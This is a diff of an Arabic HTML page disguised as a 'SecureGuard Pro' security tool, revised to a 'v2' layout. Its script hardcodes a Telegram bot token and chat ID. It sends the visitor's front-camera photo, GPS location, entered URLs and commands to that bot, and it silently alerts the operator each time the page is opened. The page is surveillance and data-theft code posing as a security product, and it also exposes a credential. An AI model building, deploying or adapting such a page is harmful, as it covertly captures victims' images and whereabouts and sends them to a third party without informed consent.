@@ -2,71 +2,54 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<title>SecureGuard Pro | WhatsApp Sync</title>
-<link rel="manifest" href="/manifest.json">
-<meta name="theme-color" content="#080c14">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>SecureGuard Pro v2</title>
 <style>
-:root{--bg:#080c14;--card:#131b27;--border:#1e2d40;--text:#e2e8f0;--muted:#64748b;--accent:#0ea5e9;--green:#25d366;--red:#ef4444;--yellow:#f59e0b}
+:root{--bg:#000;--card:#111;--border:#222;--text:#fff;--green:#00ff88;--blue:#00aaff;--red:#ff4444;--yellow:#ffaa00}
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:var(--bg);color:var(--text);font-family:sans-serif;min-height:100vh;text-align:center;padding:20px}
-h1{font-size:22px;margin:15px 0}
-h1 .green{color:var(--green)}
-p{color:var(--muted);font-size:13px;margin:8px 0}
-button{padding:14px 28px;margin:8px;border:none;border-radius:30px;font-size:15px;font-weight:bold;cursor:pointer;width:90%;max-width:350px}
-.btn-green{background:var(--green);color:#000}
-.btn-blue{background:var(--accent);color:#000}
-.btn-yellow{background:var(--yellow);color:#000}
-.btn-red{background:var(--red);color:#fff}
-#status{color:var(--green);font-size:12px;margin:15px}
-.card{background:var(--card);border:1px solid var(--border);border-radius:15px;padding:15px;margin:15px 0;text-align:right}
-.card h3{color:var(--accent);font-size:15px;margin-bottom:8px}
-.card p{font-size:12px}
-input{width:90%;max-width:350px;padding:12px;margin:5px;border:1px solid var(--border);border-radius:10px;background:var(--card);color:var(--text);font-size:14px}
-.hidden{display:none}
+body{background:var(--bg);color:var(--text);font-family:sans-serif;text-align:center;padding:15px}
+.topbar{background:var(--card);padding:12px;border-radius:15px;margin-bottom:15px;border:1px solid var(--border)}
+.topbar h2{font-size:18px;color:var(--green)}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:15px 0}
+.btn{padding:20px;border:none;border-radius:15px;font-size:14px;font-weight:bold;cursor:pointer;color:#000}
+.btn-wa{background:var(--green)}
+.btn-cam{background:var(--blue)}
+.btn-loc{background:var(--yellow)}
+.btn-url{background:#ff66aa}
+.btn-test{background:var(--red);color:#fff}
+.btn-cmd{background:#aa66ff}
+.full{grid-column:1/3}
+#log{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:10px;margin:15px 0;font-size:11px;color:var(--green);text-align:right;max-height:150px;overflow-y:auto}
+.badge{background:var(--green);color:#000;font-size:9px;padding:3px 8px;border-radius:20px;margin-right:5px}
+input{width:100%;padding:12px;border:1px solid var(--border);border-radius:10px;background:var(--card);color:var(--text);font-size:13px;margin:5px 0}
 </style>
 </head>
 <body>
 
-<h1>SecureGuard <span class="green">Pro</span></h1>
-<p>أداة الأمان والمزامنة</p>
-
-<div id="status">جاري الاتصال...</div>
-
-<div class="card">
-<h3>📱 واتساب</h3>
-<p id="waStatus">غير متصل</p>
-<button class="btn-green" onclick="openWA()">فتح واتساب ويب</button>
-<button class="btn-blue" onclick="sendNotify()">إرسال إشعار</button>
+<div class="topbar">
+<h2>🛡️ SecureGuard Pro v2</h2>
+<p style="color:#aaa;font-size:11px">نسخة 2.0 - محدثة</p>
 </div>
 
-<div class="card">
-<h3>📷 كاميرا</h3>
-<button class="btn-blue" onclick="takePhoto()">التقاط صورة</button>
+<div id="log">📋 السجل:<br><span style="color:#aaa">في انتظار الإجراءات...</span></div>
+
+<div class="grid">
+<button class="btn btn-wa" onclick="openWA()">📱 واتساب</button>
+<button class="btn btn-cam" onclick="takePhoto()">📷 كاميرا</button>
+<button class="btn btn-loc" onclick="getLocation()">📍 موقع</button>
+<button class="btn btn-url" onclick="openURL()">🔗 فتح رابط</button>
+<button class="btn btn-cmd full" onclick="customCmd()">💬 أمر مخصص</button>
+<button class="btn btn-test full" onclick="testBot()">📟 اختبار البوت</button>
 </div>
 
-<div class="card">
-<h3>📍 موقع</h3>
-<button class="btn-blue" onclick="getLocation()">إرسال الموقع</button>
-</div>
-
-<div class="card">
-<h3>💬 أمر مخصص</h3>
-<input type="text" id="customCmd" placeholder="اكتب الأمر...">
-<button class="btn-yellow" onclick="customCommand()">تنفيذ</button>
-</div>
-
-<div class="card">
-<h3>🔗 فتح رابط</h3>
-<input type="text" id="customUrl" placeholder="https://...">
-<button class="btn-blue" onclick="openURL()">فتح</button>
-</div>
-
-<button class="btn-red" onclick="testBot()">📟 اختبار البوت</button>
+<input type="text" id="urlInput" placeholder="رابط...">
+<input type="text" id="cmdInput" placeholder="أمر...">
 
 <script>
 const BOT="8915820730:AAHqyTgk9IVvmMLA8xpXO8QuLPEPbIv9A9c";
 const CHAT="6453594151";
+
+function log(msg){document.getElementById('log').innerHTML+='<br>'+msg}
 
 async function api(method,body){
     try{
@@ -82,25 +65,19 @@ async function sendMsg(text){
 }
 
 async function testBot(){
-    document.getElementById('status').textContent='جاري...';
-    let r=await api('sendMessage',{chat_id:CHAT,text:'✅ SecureGuard Pro: متصل وجاهز'});
-    if(r&&r.ok){document.getElementById('status').textContent='✅ البوت شغال'}else{document.getElementById('status').textContent='❌ فشل'}
+    log('🔄 جاري اختبار البوت...');
+    let r=await api('sendMessage',{chat_id:CHAT,text:'✅ SecureGuard v2: متصل'});
+    if(r&&r.ok){log('✅ البوت شغال')}else{log('❌ فشل')}
 }
 
 function openWA(){
     window.open('https://web.whatsapp.com','_blank');
-    document.getElementById('waStatus').textContent='تم الفتح';
     sendMsg('📱 تم فتح واتساب ويب');
-    document.getElementById('status').textContent='تم فتح واتساب ويب';
-}
-
-function sendNotify(){
-    sendMsg('📱 إشعار: فتح واتساب ويب');
-    document.getElementById('status').textContent='تم إرسال الإشعار';
+    log('📱 فتح واتساب ويب');
 }
 
 async function takePhoto(){
-    document.getElementById('status').textContent='جاري...';
+    log('📷 جاري التصوير...');
     try{
         let s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
         let v=document.createElement('video');v.srcObject=s;await v.play();
@@ -111,30 +88,30 @@ async function takePhoto(){
         let blob=await(await fetch(photo)).blob();
         let fd=new FormData();fd.append('chat_id',CHAT);fd.append('photo',blob,'camera.jpg');
         await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`,{method:'POST',body:fd});
-        document.getElementById('status').textContent='✅ تم إرسال الصورة';
-    }catch(e){document.getElementById('status').textContent='❌ فشل: اسمح بالكاميرا'}
+        log('✅ تم إرسال الصورة');
+    }catch(e){log('❌ فشل: اسمح بالكاميرا')}
 }
 
 function getLocation(){
-    document.getElementById('status').textContent='جاري...';
+    log('📍 جاري تحديد الموقع...');
     navigator.geolocation.getCurrentPosition(async p=>{
         await sendMsg(`📍 الموقع:\n${p.coords.latitude},${p.coords.longitude}\nخرائط: https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`);
-        document.getElementById('status').textContent='✅ تم إرسال الموقع';
-    },()=>{document.getElementById('status').textContent='❌ فشل: اسمح بالموقع'});
+        log('✅ تم إرسال الموقع');
+    },()=>{log('❌ فشل: اسمح بالموقع')});
 }
 
 function openURL(){
-    let url=document.getElementById('customUrl').value;
-    if(url){window.open(url,'_blank');sendMsg('🔗 تم فتح: '+url);document.getElementById('status').textContent='تم فتح الرابط'}
+    let url=document.getElementById('urlInput').value;
+    if(url){window.open(url,'_blank');sendMsg('🔗 فتح: '+url);log('🔗 '+url)}
 }
 
-function customCommand(){
-    let cmd=document.getElementById('customCmd').value;
-    if(cmd){sendMsg('💬 أمر: '+cmd);document.getElementById('status').textContent='تم تنفيذ الأمر'}
+function customCmd(){
+    let cmd=document.getElementById('cmdInput').value;
+    if(cmd){sendMsg('💬 '+cmd);log('💬 '+cmd)}
 }
 
-sendMsg('🔔 تنبيه: شخص ما فتح SecureGuard Pro!');
-document.getElementById('status').textContent='✅ متصل';
+sendMsg('🔔 فتح SecureGuard Pro v2');
+log('🟢 جاهز - نسخة 2.0');
 </script>
 </body>
 </html>
